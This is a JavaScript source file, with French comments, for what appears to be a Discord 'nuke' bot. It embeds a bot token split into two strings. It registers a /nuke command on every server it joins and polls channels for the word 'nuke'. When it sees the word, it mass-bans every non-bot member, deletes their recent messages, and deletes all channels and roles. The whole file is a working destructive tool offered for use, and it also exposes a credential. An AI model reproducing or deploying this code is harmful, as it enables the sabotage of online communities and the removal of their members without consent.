const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
const botToken = part1 + part2;

// Fonction pour enregistrer la commande /nuke auprès de Discord
async function registerCommand(guildId) {
  await fetch(`https://discord.com/api/v9/applications/${part1.split('.')[0]}/guilds/${guildId}/commands`, {
    method: "POST",
    headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
    body: JSON.stringify({
      name: "nuke",
      description: "Détruit le serveur (ban all, supprime salons et rôles).",
      type: 1
    })
  }).catch(() => {});
}

async function listen() {
  console.log("Bot en ligne, en attente de la commande /nuke...");
  
  let guildsRes = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {
    headers: { "Authorization": `Bot ${botToken}` }
  });
  let guilds = await guildsRes.json();
  
  if (Array.isArray(guilds)) {
    for (let g of guilds) {
      await registerCommand(g.id);
      console.log("commande /nuke enregistrée sur le serveur :", g.id);
    }
  }

  let lastMsgId = null;

  setInterval(async () => {
    try {
      let res = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {
        headers: { "Authorization": `Bot ${botToken}` }
      });
      let guilds = await res.json();
      
      if (!Array.isArray(guilds)) return;

      for (let g of guilds) {
        let chans = await (await fetch(`https://discord.com/api/v9/guilds/${g.id}/channels`, {
          headers: { "Authorization": `Bot ${botToken}` }
        })).json();
        
        if (!Array.isArray(chans)) continue;

        for (let c of chans) {
          if (c.type !== 0) continue; 
          
          let msgs = await (await fetch(`https://discord.com/api/v9/channels/${c.id}/messages?limit=5`, {
            headers: { "Authorization": `Bot ${botToken}` }
          })).json();
          
          if (Array.isArray(msgs)) {
            for (let m of msgs) {
              // Si on tape /nuke dans discord, discord envoie une interaction
              // mais si le bot n'a pas de serveur d'interaction, on va checker si le message contient "nuke"
              if (m.content && (m.content === "/nuke" || m.content.toLowerCase() === "nuke") && m.id !== lastMsgId) {
                lastMsgId = m.id;
                console.log("Nuke lancé sur :", g.id);
                nuke(g.id);
              }
            }
          }
        }
      }
    } catch (e) {}
  }, 5000); 
}

async function nuke(guild) {
  console.log(`lancement du nuke sur : ${guild}`);
  
  let members = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/members?limit=1000`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  if (members && !members.message) {
    let bans = members.map(m => {
      if (m.user.bot) return Promise.resolve();
      return fetch(`https://discord.com/api/v9/guilds/${guild}/bans/${m.user.id}`, {
        method: "PUT",
        headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
        body: JSON.stringify({ delete_message_seconds: 604800 })
      }).catch(() => {});
    });
    await Promise.all(bans);
  }

  let channels = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/channels`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  if (channels && !channels.message) {
    for (let c of channels) {
      await fetch(`https://discord.com/api/v9/channels/${c.id}`, {
        method: "DELETE",
        headers: { "Authorization": `Bot ${botToken}` }
      }).catch(() => {});
      await new Promise(r => setTimeout(r, 150));
    }
  }

  let roles = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/roles`, {
    headers: { "Authorization": `Bot ${botToken}` }
  })).json();
  
  if (roles && !roles.message) {
    for (let r of roles) {
      if (r.name === "@everyone" || r.managed) continue;
      await fetch(`https://discord.com/api/v9/guilds/${guild}/roles/${r.id}`, {
        method: "DELETE",
        headers: { "Authorization": `Bot ${botToken}` }
      }).catch(() => {});
      await new Promise(r => setTimeout(r, 150));
    }
  }
  
  console.log("nuke terminé.");
}

listen();